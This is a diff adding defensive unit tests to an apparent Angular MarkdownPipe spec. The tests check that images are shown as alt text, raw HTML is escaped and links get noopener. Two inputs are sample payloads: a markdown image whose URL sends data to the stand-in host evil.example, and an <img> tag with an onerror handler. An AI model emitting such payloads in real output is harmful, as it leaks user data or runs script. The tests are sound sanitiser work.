@@ -25,6 +25,31 @@ describe('MarkdownPipe', () => {
     expect(pipe.transform('```text\nhello\n```')).not.toContain('md-code-copy');
   });
 
+  it('renders a markdown image as its alt text, never an <img> that loads a URL', () => {
+    const html = pipe.transform('Look: ![balance chart](https://evil.example/?d=12345)');
+
+    expect(html).not.toContain('<img');
+    expect(html).not.toContain('evil.example');
+    expect(html).toContain('balance chart');
+  });
+
+  it('shows raw HTML as text so a literal <img> cannot bypass the image rule', () => {
+    const html = pipe.transform('<img src="https://evil.example/?d=1" onerror="x()">hi');
+
+    expect(html).not.toContain('<img');
+    expect(html).toContain('&lt;img');
+  });
+
+  it('opens links in a new tab without leaking the opener', () => {
+    const html = pipe.transform('See [the docs](https://example.com/page "Docs") and https://example.org');
+
+    expect(html).toContain(
+      '<a target="_blank" rel="noopener noreferrer" href="https://example.com/page" title="Docs">the docs</a>',
+    );
+    expect(html).toContain('href="https://example.org"');
+    expect(html.match(/rel="noopener noreferrer"/g)?.length).toBe(2);
+  });
+
   it('returns an empty string for empty input', () => {
     expect(pipe.transform('')).toBe('');
     expect(pipe.transform(null)).toBe('');
